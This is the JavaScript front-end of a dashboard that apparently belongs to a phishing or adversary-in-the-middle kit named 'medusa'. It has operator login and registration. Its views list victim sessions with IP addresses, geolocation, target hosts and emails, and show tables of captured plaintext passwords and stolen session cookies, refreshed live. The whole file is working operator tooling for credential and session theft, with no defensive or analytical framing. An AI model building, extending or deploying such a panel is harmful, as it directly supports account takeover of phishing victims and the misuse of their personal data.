let token = localStorage.getItem('medusa_token');

const authContainer = document.getElementById('auth-container');
const registerCard = document.getElementById('register-card');
const loginCard = document.getElementById('login-card');
const dashboard = document.getElementById('dashboard');
const registerBtn = document.getElementById('register-btn');
const loginBtn = document.getElementById('login-btn');
const goToLoginLink = document.getElementById('go-to-login');
const registerError = document.getElementById('register-error');
const loginError = document.getElementById('login-error');
const logoutBtn = document.getElementById('logout-btn');
const pageTitle = document.getElementById('page-title');
const pageContent = document.getElementById('page-content');

// Check setup status on page load
async function checkSetup() {
    try {
        const res = await fetch('/api/setup-status');
        const data = await res.json();
        if (data.needsSetup) {
            registerCard.classList.remove('hidden');
            loginCard.classList.add('hidden');
        } else {
            loginCard.classList.remove('hidden');
            registerCard.classList.add('hidden');
        }
    } catch (err) {
        console.error('Setup check failed', err);
        // Default to login
        loginCard.classList.remove('hidden');
    }
}

function showAuth() {
    authContainer.classList.remove('hidden');
    dashboard.classList.add('hidden');
}

function showDashboard() {
    authContainer.classList.add('hidden');
    dashboard.classList.remove('hidden');
}

// Initial load
if (token) {
    showDashboard();
    loadOverview();
    connectSSE();
} else {
    checkSetup();
}

// Register
registerBtn.addEventListener('click', async () => {
    const username = document.getElementById('reg-username').value.trim();
    const email = document.getElementById('reg-email').value.trim();
    const password = document.getElementById('reg-password').value;
    if (!username || !email || !password) {
        registerError.textContent = 'All fields are required';
        return;
    }
    try {
        const res = await fetch('/api/register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, email, password })
        });
        const data = await res.json();
        if (res.ok) {
            // Registration successful, show login
            registerCard.classList.add('hidden');
            loginCard.classList.remove('hidden');
            registerError.textContent = '';
        } else {
            registerError.textContent = data.error || 'Registration failed';
        }
    } catch (err) {
        registerError.textContent = 'Network error';
    }
});

// Go to login link
goToLoginLink.addEventListener('click', (e) => {
    e.preventDefault();
    registerCard.classList.add('hidden');
    loginCard.classList.remove('hidden');
});

// Login
loginBtn.addEventListener('click', async () => {
    const username = document.getElementById('login-username').value.trim();
    const password = document.getElementById('login-password').value;
    if (!username || !password) {
        loginError.textContent = 'Username and password required';
        return;
    }
    try {
        const res = await fetch('/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await res.json();
        if (res.ok) {
            token = data.token;
            localStorage.setItem('medusa_token', token);
            showDashboard();
            loadOverview();
            connectSSE();
            loginError.textContent = '';
        } else {
            loginError.textContent = data.error || 'Login failed';
        }
    } catch (err) {
        loginError.textContent = 'Network error';
    }
});

// Logout
logoutBtn.addEventListener('click', () => {
    localStorage.removeItem('medusa_token');
    token = null;
    showAuth();
    // Show login form (assuming registration already done)
    loginCard.classList.remove('hidden');
    registerCard.classList.add('hidden');
});

// Fetch with auth
async function fetchWithAuth(url) {
    const res = await fetch(url, {
        headers: { 'Authorization': `Bearer ${token}` }
    });
    if (res.status === 401) {
        localStorage.removeItem('medusa_token');
        token = null;
        showAuth();
        loginCard.classList.remove('hidden');
        registerCard.classList.add('hidden');
        throw new Error('Unauthorized');
    }
    return res.json();
}

// Navigation
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', async (e) => {
        e.preventDefault();
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        const page = item.dataset.page;
        if (page === 'overview') {
            pageTitle.textContent = 'Overview';
            loadOverview();
        } else if (page === 'sessions') {
            pageTitle.textContent = 'Sessions';
            loadSessions();
        } else if (page === 'credentials') {
            pageTitle.textContent = 'Credentials';
            loadCredentials();
        } else if (page === 'cookies') {
            pageTitle.textContent = 'Cookies';
            loadCookies();
        }
    });
});

// Load Overview
async function loadOverview() {
    try {
        const stats = await fetchWithAuth('/api/stats');
        const sessions = await fetchWithAuth('/api/sessions');
        pageContent.innerHTML = `
            <div class="card" style="display:grid; grid-template-columns: repeat(3, 1fr); gap:20px;">
                <div><div class="card-title">Active Sessions</div><h3 style="font-size:2rem;color:var(--red)">${stats.sessions}</h3></div>
                <div><div class="card-title">Credentials Captured</div><h3 style="font-size:2rem;color:var(--red)">${stats.credentials}</h3></div>
                <div><div class="card-title">Cookies Stolen</div><h3 style="font-size:2rem;color:var(--red)">${stats.cookies}</h3></div>
            </div>
            <div class="card">
                <div class="card-title">Recent Sessions</div>
                <table>
                    <thead><tr><th>IP</th><th>Geo</th><th>Target</th><th>Status</th><th>Email</th></tr></thead>
                    <tbody>
                        ${sessions.slice(0,10).map(s => `
                            <tr>
                                <td>${s.ip || '-'}</td>
                                <td>${s.geo ? `${s.geo.city}, ${s.geo.country}` : '-'}</td>
                                <td>${s.host || '-'}</td>
                                <td>${s.status || '-'}</td>
                                <td>${s.email || '-'}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        `;
    } catch (err) {
        console.error(err);
    }
}

// Load Sessions
async function loadSessions() {
    try {
        const sessions = await fetchWithAuth('/api/sessions');
        pageContent.innerHTML = `
            <div class="card">
                <div class="card-title">All Sessions</div>
                <table>
                    <thead><tr><th>IP</th><th>User Agent</th><th>Geo</th><th>Target Host</th><th>Status</th><th>Email</th><th>Cookies</th></tr></thead>
                    <tbody>
                        ${sessions.map(s => `
                            <tr>
                                <td>${s.ip || '-'}</td>
                                <td>${s.user_agent || '-'}</td>
                                <td>${s.geo ? `${s.geo.city}, ${s.geo.country}` : '-'}</td>
                                <td>${s.host || '-'}</td>
                                <td>${s.status || '-'}</td>
                                <td>${s.email || '-'}</td>
                                <td>${s.cookie_count || 0}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        `;
    } catch (err) {
        console.error(err);
    }
}

// Load Credentials
async function loadCredentials() {
    try {
        const creds = await fetchWithAuth('/api/credentials');
        pageContent.innerHTML = `
            <div class="card">
                <div class="card-title">Captured Credentials</div>
                <table>
                    <thead><tr><th>Email</th><th>Password</th><th>IP</th><th>Captured At</th></tr></thead>
                    <tbody>
                        ${creds.map(c => `
                            <tr>
                                <td>${c.email}</td>
                                <td>${c.password}</td>
                                <td>${c.ip || '-'}</td>
                                <td>${new Date(c.captured_at).toLocaleString()}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        `;
    } catch (err) {
        console.error(err);
    }
}

// Load Cookies
async function loadCookies() {
    try {
        const cookies = await fetchWithAuth('/api/cookies');
        pageContent.innerHTML = `
            <div class="card">
                <div class="card-title">Captured Cookies</div>
                <table>
                    <thead><tr><th>Name</th><th>Domain</th><th>Expires</th><th>IP</th></tr></thead>
                    <tbody>
                        ${cookies.map(c => `
                            <tr>
                                <td>${c.name}</td>
                                <td>${c.domain}</td>
                                <td>${new Date(c.expires).toLocaleString()}</td>
                                <td>${c.ip || '-'}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        `;
    } catch (err) {
        console.error(err);
    }
}

// SSE for live updates
function connectSSE() {
    const eventSource = new EventSource('/api/events');
    eventSource.onmessage = (event) => {
        const activeNav = document.querySelector('.nav-item.active');
        if (activeNav) {
            activeNav.click();
        }
        const live = document.getElementById('live-indicator');
        live.style.animation = 'none';
        setTimeout(() => live.style.animation = '', 10);
    };
    eventSource.onerror = () => {
        console.log('SSE connection lost, retrying...');
    };
}
